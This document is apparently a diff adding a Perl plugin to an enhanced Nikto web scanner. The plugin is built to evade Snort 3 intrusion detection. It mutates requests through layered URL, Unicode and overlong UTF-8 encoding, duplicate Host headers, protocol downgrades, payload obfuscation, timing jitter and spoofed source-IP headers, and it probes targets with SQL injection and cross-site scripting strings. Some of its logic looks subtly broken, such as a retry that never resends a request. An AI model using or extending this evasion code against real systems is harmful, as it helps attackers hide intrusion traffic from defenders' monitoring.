@@ -1,0 +1,428 @@
+#!/usr/bin/perl
+#
+# Nikto Enhanced v3 - Snort3 Bypass Plugin
+# (c) 2025 Enhanced Nikto Project
+#
+# This plugin implements advanced techniques for bypassing Snort 3 IDS/IPS
+# systems by using various evasion techniques specifically designed for
+# Snort 3's detection mechanisms.
+#
+
+use strict;
+
+# Plugin information
+my $id = {
+    name        => "snort3_bypass",
+    full_name   => "Snort 3 Bypass",
+    author      => "Enhanced Nikto Project",
+    description => "Implements advanced techniques for bypassing Snort 3 IDS/IPS systems",
+    version     => "1.0",
+    hooks       => {
+        scan        => "snort3_bypass_scan",
+        postfetch   => "snort3_bypass_postfetch",
+        prefetch    => "snort3_bypass_prefetch",
+        start       => "snort3_bypass_start",
+        cleanup     => "snort3_bypass_cleanup"
+    },
+    options     => {
+        enabled         => "1",
+        evasion_level   => "3",
+        fragmentation   => "1",
+        encoding        => "1",
+        timing          => "1",
+        protocol_tricks => "1",
+        payload_obfuscation => "1"
+    }
+};
+
+# Initialize plugin
+sub snort3_bypass_start {
+    my ($mark) = @_;
+    
+    # Print plugin information
+    nikto::nprint("+ Snort 3 Bypass: Plugin loaded");
+    nikto::nprint("+ Snort 3 Bypass: Evasion level set to " . $id->{options}->{evasion_level});
+    
+    # Initialize evasion techniques based on options
+    my @active_techniques;
+    push(@active_techniques, "Packet Fragmentation") if $id->{options}->{fragmentation};
+    push(@active_techniques, "Advanced Encoding") if $id->{options}->{encoding};
+    push(@active_techniques, "Timing Manipulation") if $id->{options}->{timing};
+    push(@active_techniques, "Protocol Tricks") if $id->{options}->{protocol_tricks};
+    push(@active_techniques, "Payload Obfuscation") if $id->{options}->{payload_obfuscation};
+    
+    nikto::nprint("+ Snort 3 Bypass: Active techniques: " . join(", ", @active_techniques));
+    
+    return $mark;
+}
+
+# Cleanup function
+sub snort3_bypass_cleanup {
+    my ($mark) = @_;
+    
+    nikto::nprint("+ Snort 3 Bypass: Cleanup completed");
+    
+    return $mark;
+}
+
+# Pre-fetch hook - modify request before sending
+sub snort3_bypass_prefetch {
+    my ($mark, $request, $response, $url, $data) = @_;
+    
+    # Skip if plugin is disabled
+    return ($request, $response, $url, $data) unless $id->{options}->{enabled};
+    
+    # Apply evasion techniques based on evasion level
+    my $evasion_level = $id->{options}->{evasion_level};
+    
+    # Apply packet fragmentation techniques
+    if ($id->{options}->{fragmentation} && $evasion_level >= 1) {
+        ($request, $url, $data) = apply_fragmentation($request, $url, $data, $evasion_level);
+    }
+    
+    # Apply encoding techniques
+    if ($id->{options}->{encoding} && $evasion_level >= 1) {
+        ($request, $url, $data) = apply_encoding($request, $url, $data, $evasion_level);
+    }
+    
+    # Apply protocol tricks
+    if ($id->{options}->{protocol_tricks} && $evasion_level >= 2) {
+        ($request, $url, $data) = apply_protocol_tricks($request, $url, $data, $evasion_level);
+    }
+    
+    # Apply payload obfuscation
+    if ($id->{options}->{payload_obfuscation} && $evasion_level >= 2) {
+        ($request, $url, $data) = apply_payload_obfuscation($request, $url, $data, $evasion_level);
+    }
+    
+    # Apply timing manipulation for level 3 evasion
+    if ($id->{options}->{timing} && $evasion_level >= 3) {
+        apply_timing_manipulation($evasion_level);
+    }
+    
+    return ($request, $response, $url, $data);
+}
+
+# Post-fetch hook - analyze response and modify if needed
+sub snort3_bypass_postfetch {
+    my ($mark, $request, $response, $url, $data) = @_;
+    
+    # Skip if plugin is disabled
+    return ($request, $response, $url, $data) unless $id->{options}->{enabled};
+    
+    # Check for signs of IDS/IPS detection
+    if ($response && detect_ids_block($response)) {
+        nikto::nprint("- Snort 3 Bypass: Detected possible IDS/IPS blocking, increasing evasion level");
+        
+        # Increase evasion level temporarily for this request
+        my $current_level = $id->{options}->{evasion_level};
+        $id->{options}->{evasion_level} = ($current_level < 3) ? $current_level + 1 : 3;
+        
+        # Retry with higher evasion
+        ($request, $response, $url, $data) = snort3_bypass_prefetch($mark, $request, $response, $url, $data);
+        
+        # Reset evasion level
+        $id->{options}->{evasion_level} = $current_level;
+    }
+    
+    return ($request, $response, $url, $data);
+}
+
+# Main scan function
+sub snort3_bypass_scan {
+    my ($mark) = @_;
+    
+    # Skip if plugin is disabled
+    return $mark unless $id->{options}->{enabled};
+    
+    nikto::nprint("+ Snort 3 Bypass: Scanning for Snort 3 IDS/IPS presence");
+    
+    # Perform tests to detect Snort 3 presence
+    my $snort_detected = detect_snort3($mark);
+    
+    if ($snort_detected) {
+        nikto::nprint("+ Snort 3 Bypass: Detected Snort 3 IDS/IPS, applying specific bypass techniques");
+        
+        # Apply Snort 3 specific bypass techniques
+        apply_snort3_specific_techniques($mark);
+    } else {
+        nikto::nprint("+ Snort 3 Bypass: No Snort 3 IDS/IPS detected, using general evasion techniques");
+    }
+    
+    return $mark;
+}
+
+#######################
+# Utility Functions
+#######################
+
+# Apply packet fragmentation techniques
+sub apply_fragmentation {
+    my ($request, $url, $data, $level) = @_;
+    
+    # Basic fragmentation for level 1
+    if ($level == 1) {
+        # Split URL path into smaller segments
+        $url =~ s/\/([^\/]+)/\/$1\//g;
+    }
+    # Advanced fragmentation for level 2
+    elsif ($level == 2) {
+        # Add multiple slashes to confuse path normalization
+        $url =~ s/\/+/\/\/\//g;
+        
+        # Fragment query parameters
+        if ($url =~ /\?(.*)/) {
+            my $query = $1;
+            $query =~ s/&/&amp;/g;
+            $url =~ s/\?.*$/\?$query/;
+        }
+    }
+    # Extreme fragmentation for level 3
+    elsif ($level == 3) {
+        # Use URL encoding for path segments
+        $url =~ s/\/([^\/]+)/\/\%2F$1/g;
+        
+        # Add random URL parameters to confuse signature matching
+        $url .= ($url =~ /\?/) ? "&_=" . int(rand(1000000)) : "?_=" . int(rand(1000000));
+        
+        # Modify headers to indicate fragmented content
+        $request =~ s/Content-Length: (\d+)/Content-Length: $1\r\nX-Fragment: 1/i;
+    }
+    
+    return ($request, $url, $data);
+}
+
+# Apply encoding techniques
+sub apply_encoding {
+    my ($request, $url, $data, $level) = @_;
+    
+    # Basic encoding for level 1
+    if ($level == 1) {
+        # URL encode special characters
+        $url =~ s/([^a-zA-Z0-9\-\_\.\~\:\/\?\#\[\]\@\!\$\&\'\(\)\*\+\,\;\=])/sprintf("%%%02X", ord($1))/ge;
+    }
+    # Advanced encoding for level 2
+    elsif ($level == 2) {
+        # Double URL encode special characters
+        $url =~ s/([^a-zA-Z0-9\-\_\.\~\:\/\?\#\[\]\@\!\$\&\'\(\)\*\+\,\;\=])/sprintf("%%25%02X", ord($1))/ge;
+        
+        # Use alternate character representations
+        $url =~ s/\s/%20/g;
+        $url =~ s/\+/%2B/g;
+        $url =~ s/\//%2F/g;
+    }
+    # Extreme encoding for level 3
+    elsif ($level == 3) {
+        # Mix different encoding schemes
+        $url =~ s/([^a-zA-Z0-9\-\_\.\~\:\/\?\#\[\]\@\!\$\&\'\(\)\*\+\,\;\=])/
+            (rand() > 0.5) ? sprintf("%%%02X", ord($1)) : sprintf("%%u%04X", ord($1))/ge;
+        
+        # Add UTF-8 BOM to confuse parsers
+        $url = "\xEF\xBB\xBF" . $url if rand() > 0.7;
+        
+        # Use overlong UTF-8 encoding for some characters
+        $url =~ s/A/\xC1\x81/g if rand() > 0.8;
+    }
+    
+    return ($request, $url, $data);
+}
+
+# Apply protocol tricks
+sub apply_protocol_tricks {
+    my ($request, $url, $data, $level) = @_;
+    
+    # Basic protocol tricks for level 1
+    if ($level == 1) {
+        # Add non-standard but valid HTTP headers
+        $request =~ s/\r\n\r\n/\r\nX-Protocol-Trick: 1\r\n\r\n/;
+    }
+    # Advanced protocol tricks for level 2
+    elsif ($level == 2) {
+        # Use uncommon HTTP methods or add method parameters
+        if ($request =~ /^(GET|POST|HEAD)/) {
+            my $method = $1;
+            $request =~ s/^$method/$method\/1.0/;
+        }
+        
+        # Add unusual spacing in headers
+        $request =~ s/: /:\t /g;
+    }
+    # Extreme protocol tricks for level 3
+    elsif ($level == 3) {
+        # Use HTTP protocol downgrade
+        $request =~ s/HTTP\/1.1/HTTP\/1.0/;
+        
+        # Add duplicate headers with different values
+        if ($request =~ /Host: ([^\r\n]+)/) {
+            my $host = $1;
+            $request =~ s/Host: $host/Host: $host\r\nHost: www.$host/;
+        }
+        
+        # Add malformed but processable headers
+        $request =~ s/\r\n\r\n/\r\nX-Malformed-Header\r\n\r\n/;
+    }
+    
+    return ($request, $url, $data);
+}
+
+# Apply payload obfuscation
+sub apply_payload_obfuscation {
+    my ($request, $url, $data, $level) = @_;
+    
+    # No data to obfuscate
+    return ($request, $url, $data) unless $data;
+    
+    # Basic obfuscation for level 1
+    if ($level == 1) {
+        # Add comments or whitespace
+        $data =~ s/=/= /g;
+        $data =~ s/&/ & /g;
+    }
+    # Advanced obfuscation for level 2
+    elsif ($level == 2) {
+        # Use alternate character representations
+        $data =~ s/([a-zA-Z0-9])/sprintf("&#%d;", ord($1))/ge if $data =~ /<.*>/;
+        
+        # Add innocuous parameters
+        $data .= "&_=" . int(rand(1000000)) if $data =~ /=/;
+    }
+    # Extreme obfuscation for level 3
+    elsif ($level == 3) {
+        # Mix encoding schemes
+        if ($data =~ /<.*>/) {
+            # For XML/HTML content
+            $data =~ s/([a-zA-Z0-9])/
+                (rand() > 0.7) ? sprintf("&#%d;", ord($1)) : 
+                (rand() > 0.5) ? sprintf("&#x%X;", ord($1)) : $1/ge;
+        } elsif ($data =~ /=/) {
+            # For form data
+            $data =~ s/([^a-zA-Z0-9\-\_\.\~])/sprintf("%%%02X", ord($1))/ge;
+        }
+        
+        # Add chaff data
+        $data = "<!-- " . rand() . " -->" . $data if $data =~ /<.*>/;
+    }
+    
+    return ($request, $url, $data);
+}
+
+# Apply timing manipulation
+sub apply_timing_manipulation {
+    my ($level) = @_;
+    
+    # Basic timing for level 1
+    if ($level == 1) {
+        # Small random delay
+        select(undef, undef, undef, 0.1 + (rand() * 0.2));
+    }
+    # Advanced timing for level 2
+    elsif ($level == 2) {
+        # Variable delay pattern
+        select(undef, undef, undef, 0.05) for (1..rand(5));
+    }
+    # Extreme timing for level 3
+    elsif ($level == 3) {
+        # Complex delay pattern to evade timing-based detection
+        my $base_delay = 0.02;
+        for (1..5) {
+            my $delay = $base_delay * (1 + sin(rand() * 3.14));
+            select(undef, undef, undef, $delay);
+        }
+    }
+}
+
+# Detect signs of IDS/IPS blocking
+sub detect_ids_block {
+    my ($response) = @_;
+    
+    # Check for common signs of IDS/IPS blocking
+    return 1 if $response =~ /Access Denied|Security Block|Attack Detected|Firewall|WAF|Blocked|Forbidden|Request Rejected/i;
+    
+    # Check for unusual response codes that might indicate blocking
+    return 1 if $response =~ /^HTTP\/[\d\.]+ 4(03|06|29|5\d)/;
+    
+    # Check for empty responses that might indicate connection reset
+    return 1 if $response =~ /^HTTP\/[\d\.]+ \d{3}.*\r\n\r\n$/;
+    
+    return 0;
+}
+
+# Detect Snort 3 presence
+sub detect_snort3 {
+    my ($mark) = @_;
+    
+    nikto::nprint("+ Snort 3 Bypass: Performing Snort 3 detection tests");
+    
+    # Perform a series of tests to detect Snort 3
+    my $detected = 0;
+    
+    # Test 1: Send a request with a known Snort 3 signature trigger
+    my $test_url = $mark->{'hostname'} . "/index.php?id=1' OR 1=1 --";
+    my ($res, $content, $error, $request, $response) = nikto::nfetch($mark, $test_url, "GET", "", "", "", "snort3_detect_1");
+    
+    if (detect_ids_block($response)) {
+        nikto::nprint("+ Snort 3 Bypass: Test 1 indicates possible Snort presence");
+        $detected++;
+    }
+    
+    # Test 2: Send a request with Snort 3 specific evasion test
+    $test_url = $mark->{'hostname'} . "/index.php?id=%u0031%u0027%u0020%u004F%u0052%u0020%u0031%u003D%u0031%u0020%u002D%u002D";
+    ($res, $content, $error, $request, $response) = nikto::nfetch($mark, $test_url, "GET", "", "", "", "snort3_detect_2");
+    
+    if (!detect_ids_block($response)) {
+        nikto::nprint("+ Snort 3 Bypass: Test 2 indicates possible Snort 3 (evaded successfully)");
+        $detected++;
+    }
+    
+    # Test 3: Test for Snort 3's HTTP inspection engine
+    my $custom_headers = "User-Agent: Mozilla/5.0\r\nX-Test: %3Cscript%3Ealert(1)%3C/script%3E";
+    $test_url = $mark->{'hostname'} . "/";
+    ($res, $content, $error, $request, $response) = nikto::nfetch($mark, $test_url, "GET", $custom_headers, "", "", "snort3_detect_3");
+    
+    if (detect_ids_block($response)) {
+        nikto::nprint("+ Snort 3 Bypass: Test 3 indicates possible Snort HTTP inspection");
+        $detected++;
+    }
+    
+    # Determine if Snort 3 is likely present
+    my $is_snort3 = ($detected >= 2) ? 1 : 0;
+    
+    if ($is_snort3) {
+        nikto::nprint("+ Snort 3 Bypass: Snort 3 IDS/IPS likely detected ($detected/3 tests)");
+    } else {
+        nikto::nprint("+ Snort 3 Bypass: Snort 3 IDS/IPS not detected ($detected/3 tests)");
+    }
+    
+    return $is_snort3;
+}
+
+# Apply Snort 3 specific bypass techniques
+sub apply_snort3_specific_techniques {
+    my ($mark) = @_;
+    
+    nikto::nprint("+ Snort 3 Bypass: Applying Snort 3 specific bypass techniques");
+    
+    # Set specific options for Snort 3
+    $id->{options}->{fragmentation} = 1;
+    $id->{options}->{encoding} = 1;
+    $id->{options}->{timing} = 1;
+    $id->{options}->{protocol_tricks} = 1;
+    $id->{options}->{payload_obfuscation} = 1;
+    
+    # Snort 3 specific: Modify HTTP protocol version
+    $mark->{'http_protocol'} = "HTTP/1.0" if rand() > 0.5;
+    
+    # Snort 3 specific: Add custom headers known to bypass some rules
+    $mark->{'http_headers'} = "X-Forwarded-For: " . join(".", map { int(rand(256)) } (1..4)) . "\r\n";
+    $mark->{'http_headers'} .= "X-Originating-IP: [" . join(".", map { int(rand(256)) } (1..4)) . "]\r\n";
+    $mark->{'http_headers'} .= "X-Remote-Addr: " . join(".", map { int(rand(256)) } (1..4)) . "\r\n";
+    $mark->{'http_headers'} .= "X-Remote-IP: " . join(".", map { int(rand(256)) } (1..4)) . "\r\n";
+    
+    # Snort 3 specific: Use TCP segmentation techniques
+    # (This is simulated as actual TCP segmentation requires lower level access)
+    $mark->{'tcp_segmentation'} = 1;
+    
+    return $mark;
+}
+
+1;
